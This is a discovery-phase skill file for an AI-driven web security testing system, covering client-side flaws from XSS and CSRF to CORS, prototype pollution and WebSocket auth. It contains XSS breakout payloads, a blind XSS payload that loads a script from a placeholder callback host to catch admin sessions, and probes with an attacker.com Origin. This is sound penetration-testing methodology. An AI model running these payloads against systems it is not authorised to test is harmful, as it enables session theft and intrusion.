---
name: clientside-discovery
description: XSS, CSRF, file upload, open redirect, clickjacking, CORS, prototype pollution. Phase start — surface detection, parameter identification, initial probes. Use when testing CLIENTSIDE vulnerabilities.
---

# SKILL-CLIENTSIDE-DISCOVERY — Client-Side Vulnerabilities Discovery — DISCOVERY
# Phase Coverage: 5-6, 17, 20-21, 25, 29-30, 33
# Vuln Classes: XSS, CSRF, File Upload, Open Redirect, Clickjacking, CORS,
#               Prototype Pollution, DOM Clobbering, WebSocket, PostMessage, Service Worker
# Purpose: Browser-based and client-side vulnerability discovery — triggers, surface classification, and passive detection

---

## Phase 5: XSS — Reflected / Stored / DOM / Blind — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns XSS, or JS signals DOM sinks/sources (Phase JS-5).
SURFACE TYPES: search, comments, profile bio, any input reflected back, URL params in SPA routing,
               support tickets, admin dashboards (blind XSS), user profiles (blind XSS).

TIER SYSTEM: Standard → Complex → Advanced
  STANDARD: Basic <script>, <img>, <svg>, event handlers, template literals
  COMPLEX: CSP bypass, filter evasion, DOM-based, mXSS, polyglot payloads,
           JSON context injection, prototype pollution → XSS
  ADVANCED: Trusted Types bypass, WebAssembly XSS vectors, SSE injection,
            CSS-based data exfil, cache-based XSS delivery, postMessage XSS chains,
            service worker XSS, XSS via DNS TXT records
  BLIND: Payloads stored and executed in admin/other-user context (support tickets, profiles, feedback)
```

### SUB-PHASE 5.1: DISCOVERY

**Passive:**
  - Check JS for DOM sinks/sources (see SKILL-INTEL Phase JS-5)
  - Mine Burp history for reflected parameters (echoed in response body)
  - Look for user-content storage (comments, profiles, bios, messages)
  - Check Content-Type for text/html on user-input endpoints
  - Review CSP headers: default-src, script-src, style-src for bypass paths

**Active:**
```bash
# Reflection probe — send unique marker and check where it lands
MARKER="XSS_REFLECT_TEST_$(date +%s)"
curl -sk "$TARGET/search?q=$MARKER" -H "Authorization: Bearer $USER1_TOKEN" | grep -o "$MARKER" && echo "[REFLECTED] in response"

# Context detection — where does input appear?
curl -sk "$TARGET/search?q=TEST" -H "Authorization: Bearer $USER1_TOKEN" | grep -oP '.{0,50}TEST.{0,50}'
# HTML context → <script> works
# Attribute context → "> escapes needed
# JS string context → '-alert(1)-' needed
# URL context → javascript: works
```

**Context Classification:**
```
□ Raw HTML: input inside <div>input</div> → full HTML injection
□ Tag Attribute: <input value="input"> → break out with ">
□ JavaScript String: var x = "input"; → break out with "; alert(1);//
□ Event Handler: <div onclick="foo('input')"> → break out with '); alert(1);//
□ URL: <a href="input"> → javascript:alert(1)
□ Style: <style>body { color: input }</style> → </style><script>alert(1)</script>
□ JSON response: → test if Content-Type: text/html and browser renders
□ Blind context: payload stored, executed in admin/other-user panel → callback-based detection
```

**Blind XSS Discovery (2026 Arsenal):**
```
SURFACES TO TEST:
  □ User profiles (name, bio, about me) — rendered in admin user list
  □ Support tickets (subject, body, attachments) — viewed by support staff
  □ Contact forms (company, comments) — viewed by admin
  □ Admin feedback forms — rendered in admin dashboard
  □ Comments/reviews — displayed to other users or admin
  □ Error messages — may be reflected in admin error logs

DETECTION:
  → Inject callback payload: <script src=https://YOUR_OAST/xss></script>
  → Monitor OAST/interactsh for callback from admin browser
  → If callback received: Blind XSS confirmed → C:H (admin session theft)
```
**Ref:** [[raw-refs/xss-blind-xss-arsenal-2026]]

---

## Phase 6: CSRF — CIA: I:H

```
TRIGGER: Phase 2 assigns CSRF, or cookie-based auth with state-changing endpoints.
SURFACE TYPES: state-changing endpoints (account settings, password change, fund transfer, role change).
```

### SUB-PHASE 6.1: DISCOVERY

**Passive:**
  - Identify all state-changing endpoints (POST/PUT/DELETE with side effects)
  - Check for CSRF tokens in forms (hidden input fields, headers)
  - Review cookies for SameSite attribute (None, Lax, Strict)
  - Check for anti-CSRF patterns: double-submit cookie, custom header checks (X-Requested-With)
  - Flag endpoints that use only cookie-based auth without additional CSRF protection

**Active:**
```bash
# Probe CSRF token requirement on state-changing endpoints
curl -sk -X POST "$TARGET/api/account/update" -H "Content-Type: application/json" \
  -H "Cookie: $USER1_COOKIE" -d '{"email":"test@test.com"}' -w " HTTP:%{http_code}"
# 200 with no token = CSRF vulnerable candidate
```

---

## Phase 17: File Upload Vulnerabilities — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns file-upload, or JS signals <input type="file">, FormData.
SURFACE TYPES: profile pictures, document uploads, import features, avatar uploads.
```

### SUB-PHASE 17.1: DISCOVERY

**Passive:**
  - Scan JS for file upload endpoints (multipart/form-data, FormData, Blob uploads)
  - Check allowed file types from client-side validation
  - Look for CDN/storage URLs indicating where uploads are stored
  - Review CSP for img-src or media-src restrictions
  - Check for S3 presigned URLs in responses (s3.amazonaws.com, presigned)

**Active:**
```bash
# Discover upload endpoints
for ep in "/upload" "/api/upload" "/file/upload" "/media/upload" "/profile/avatar" \
          "/api/v1/upload/file" "/api/v1/upload" "/api/files/upload"; do
  S=$(curl -sk -w "%{http_code}" -o /dev/null "$TARGET$ep")
  [[ "$S" != "40"* && "$S" != "000" ]] && echo "[UPLOAD ENDPOINT] $TARGET$ep → HTTP $S"
done

# Test S3 storage detection
for ep in "/upload" "/api/upload" "/file/upload"; do
  RESP=$(curl -sk -X POST "$TARGET$ep" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/test.txt;filename=test.txt" 2>/dev/null)
  echo "$RESP" | grep -oP 'https?://[^"]*s3[^"]*' && echo "[S3 STORAGE] $ep → S3 detected"
done

# Check for presigned URL patterns
curl -sk "$TARGET" | grep -oP 'https?://[^"]*presigned[^"]*|https?://[^"]*s3[^"]*amazonaws[^"]*' | head -5
```

---

## Phase 20: Open Redirect — CIA: C:M I:M

```
TRIGGER: Phase 2 assigns open-redirect, or JS signals window.location = userParam.
SURFACE TYPES: redirect endpoints, logout flows, login ?next= params, URL shorteners.
```

### SUB-PHASE 20.1: DISCOVERY

**Passive:**
  - Scan JS for window.location assignments, window.open calls with user-controlled params
  - Check for redirect URL parameters: ?next=, ?redirect=, ?url=, ?return=, ?goto=
  - Review Burp history for 3xx responses with Location headers
  - Look for OAuth flows with redirect_uri parameters

**Active:**
```bash
# Discover redirect endpoints
REDIRECT_ENDPOINTS=("/redirect" "/goto" "/logout" "/login" "/out" "/link" "/url" "/next" "/return")
for endpoint in "${REDIRECT_ENDPOINTS[@]}"; do
  S=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
  [[ "$S" != "40"* && "$S" != "000" ]] && echo "[REDIRECT ENDPOINT] $TARGET$endpoint → HTTP $S"
done
```

---

## Phase 21: Clickjacking — CIA: I:M

```
TRIGGER: Phase 2 assigns clickjacking, or state-changing pages without frame protection.
SURFACE TYPES: state-changing pages (account settings, delete, transfer).
```

### SUB-PHASE 21.1: DISCOVERY

**Passive:**
  - Check response headers for X-Frame-Options (DENY, SAMEORIGIN, or missing)
  - Check CSP for frame-ancestors directive (preferred over X-Frame-Options)
  - Identify sensitive action pages (settings, admin, transfers)
  - Note: Chrome ignores X-Frame-Options ALLOW-FROM (use CSP frame-ancestors)

**Active:**
```bash
# Check frame protection headers
curl -sk -I "$TARGET" | grep -iE 'x-frame-options|content-security-policy'
# Missing both = potentially clickjackable
```

---

## Phase 25: CORS Misconfiguration — CIA: C:H

```
TRIGGER: Phase 2 assigns CORS, or JS signals credentials: 'include' in fetch.
SURFACE TYPES: any API endpoint that serves JSON and reflects Origin with ACAO header.
```

### SUB-PHASE 25.1: DISCOVERY

**Passive:**
  - Scan JS for fetch() calls with credentials: 'include' or credentials: 'same-origin'
  - Check API responses for Access-Control-Allow-Origin header
  - Look for endpoints that serve sensitive data (user info, tokens, financial data)
  - Review CORS preflight behavior: OPTIONS request handling

**Active:**
```bash
# Probe CORS headers on main APIs
curl -sk -I "$TARGET/api/user/me" -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer $USER1_TOKEN" | grep -i 'access-control'
```

---

## Phase 29: Prototype Pollution — CIA: C:M I:H

```
TRIGGER: Phase 2 assigns prototype-pollution, or JS signals _.merge, Object.assign.
SURFACE TYPES: Node.js apps using lodash merge, jQuery extend, custom deep merge.
```

### SUB-PHASE 29.1: DISCOVERY

**Passive:**
  - Scan JS for dangerous merge functions: _.merge, _.extend, _.assign, $.extend, Object.assign
  - Check for query string parsing that splats into objects
  - Review API endpoints that accept JSON bodies and merge into config objects
  - Look for client-side apps that read URL params into object properties

**Active:**
```bash
# Simple PP probe on API endpoints
curl -sk "$TARGET/api/endpoint" -H "Authorization: Bearer $USER1_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"pp_test"}}' -w " HTTP:%{http_code}"
```

---

## Phase 30: DOM Clobbering — CIA: C:M I:M

```
TRIGGER: Phase 2 assigns dom-clobbering, or JS signals window.config from DOM.
SURFACE TYPES: apps that read window.config, window.appData, window.settings from DOM.
```

### SUB-PHASE 30.1: DISCOVERY

**Passive:**
  - Scan JS for window.* references that might originate from DOM elements
  - Check for patterns: `window.config`, `window.settings`, `window.appData`
  - Look for HTML injection points where anchor/area/form elements can be injected
  - Review for patterns like `document.getElementById('id').value` or `id.value` shorthand

**Active:**
```bash
# Discover DOM clobbering sinks via Firefox DevTools
mcp_firefox-devtools_clear_console_messages()
mcp_firefox-devtools_evaluate_script(
  function="() => {
    const sinks = [];
    const patterns = ['config', 'appData', 'settings', '_env', 'initData'];
    patterns.forEach(p => {
      if (window[p] !== undefined) {
        sinks.push('window.' + p + ' = ' + JSON.stringify(window[p]).substring(0,200));
      }
    });
    return sinks.join('\\n');
  }"
)
mcp_firefox-devtools_list_console_messages()
```

---

## Phase 33: WebSocket Security - CIA: C:H I:H

```
TRIGGER: Phase 2 assigns websocket, or JS signals new WebSocket(), ws://, wss://.
SURFACE TYPES: real-time features (chat, notifications, live dashboards, collaborative tools).
SOURCE: PortSwigger Web Security Academy (websockets topic) + aw-junaid/bug-bounty + PayloadsAllTheThings cheatsheets (ingested 2026-08-08).
```

### SUB-PHASE 33.1: DISCOVERY

**Passive:**
  - Scan JS for WebSocket connections (new WebSocket(), ws://, wss://)
  - Check WebSocket handshake headers in Burp history
  - Look for WebSocket event handlers (onmessage, onopen, onclose)
  - Identify if WebSocket uses cookie auth or token auth
  - Also check WebSocket handshake headers in Caido history (caido_list_requests httpql req.host.eq:"ws.target.com")
  - Enumerate WS streams (caido_list_ws_streams) and read frames (caido_list_ws_messages) - note direction labels may appear reversed in Caido output
  - Check if the app itself connects with NO ticket/token (some WS endpoints need zero auth)
  - Identify the exact auth model: cookie-only, Bearer/ticket in query string, or none (this decides CSWSH vs token-steal threat model)

**Active:**
```bash
# Discover WebSocket endpoints from JS bundles
grep -rhoP '(wss?://[^"'\''\s,)]+)' ~/agents/acy/fullrecon/${SLUG}/js/*.js 2>/dev/null | sort -u

# Python websockets lib (installed) - connect with no creds to test if a ticket is required:
python3 - << 'PY'
import asyncio, websockets
async def t():
    async with websockets.connect('wss://TARGET/ws', open_timeout=8) as ws:
        print(await asyncio.wait_for(ws.recv(), timeout=3))  # welcome?
asyncio.run(t())
PY
```

**Key probing questions (answer before moving to HUNT):**
  □ Does the handshake require a ticket/token? Test with NO credentials.
  □ Is Origin validated? Send `Origin: https://attacker.com`.
  □ What is the message envelope? (JSON `{"action":"..."}` vs `{"type":"..."}`)
  □ Which channels exist? Public (ticker) vs private (user:{id}, balances, orders, notifications).
  □ Does the server blanket-ack every subscribe, or validate channel ownership?
  □ Does the WS use cookie auth (CSWSH-relevant) or query/token auth?

*SKILL-CLIENTSIDE-DISCOVERY — Part of the acy Agentic Security Research System v3.0*
